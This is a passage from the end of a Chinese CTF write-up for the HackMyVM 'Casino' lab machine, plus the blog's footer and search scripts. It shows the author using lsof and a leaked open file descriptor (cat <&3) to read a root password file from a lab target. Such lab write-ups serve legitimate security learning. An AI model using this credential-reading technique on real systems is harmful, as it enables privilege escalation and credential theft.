<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>shimmer<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>shimmer<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>shimmer<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span> </code></pre>
<p>holyshit,为什么是shimmer的权限……<br>这里有点懵逼，看了HGBE师傅的wp，然后又看了群主的wp，原来是因为open没有关闭</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">lsof</span> /opt/root.pass
COMMAND  PID    <span class="token environment constant">USER</span>   FD   TYPE DEVICE SIZE/OFF   NODE NAME
<span class="token function">sh</span>      <span class="token number">1227</span> shimmer    3r   REG    <span class="token number">8,1</span>       <span class="token number">15</span> <span class="token number">522246</span> /opt/root.pass
$ <span class="token function">cat</span> /proc/1227/fd/3
cat: /proc/1227/fd/3: Permiso denegado
$ 
$ <span class="token builtin class-name">cd</span> /proc/1227/fd
$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">0</span>
dr-x------ <span class="token number">2</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token builtin class-name">.</span>
dr-xr-xr-x <span class="token number">9</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token punctuation">..</span>
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">0</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">1</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">10</span> -<span class="token operator">></span> /dev/tty
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">2</span> -<span class="token operator">></span> /dev/pts/0
lr-x------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">3</span> -<span class="token operator">></span> /opt/root.pass</code></pre>
<p>果然，当前pid还在打开这个文件，open的时候只能读一次<br>然后把他从管道里取出来，顺便测试了一下果然只能读一次</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">0</span>
dr-x------ <span class="token number">2</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token builtin class-name">.</span>
dr-xr-xr-x <span class="token number">9</span> shimmer shimmer  <span class="token number">0</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token punctuation">..</span>
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">0</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">1</span> -<span class="token operator">></span> /dev/pts/0
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">10</span> -<span class="token operator">></span> /dev/tty
lrwx------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">2</span> -<span class="token operator">></span> /dev/pts/0
lr-x------ <span class="token number">1</span> shimmer shimmer <span class="token number">64</span> may  <span class="token number">6</span> <span class="token number">16</span>:23 <span class="token number">3</span> -<span class="token operator">></span> /opt/root.pass
$ <span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;3</span>
masteradmin420
$ <span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;3</span>
$ </code></pre>
<p>靶机难度还行，就最后这个open不懂，也是学到了东西。</p>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/16d10af0/" title="HackMyVM-Casino">https://tao0845.github.io/posts/16d10af0/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/b774aeb/" rel="prev" title="NTLM协议"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">NTLM协议</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/7345579c/" rel="next" title="XYCTF未解题复现"><span class="post-nav-text">XYCTF未解题复现</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2024 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>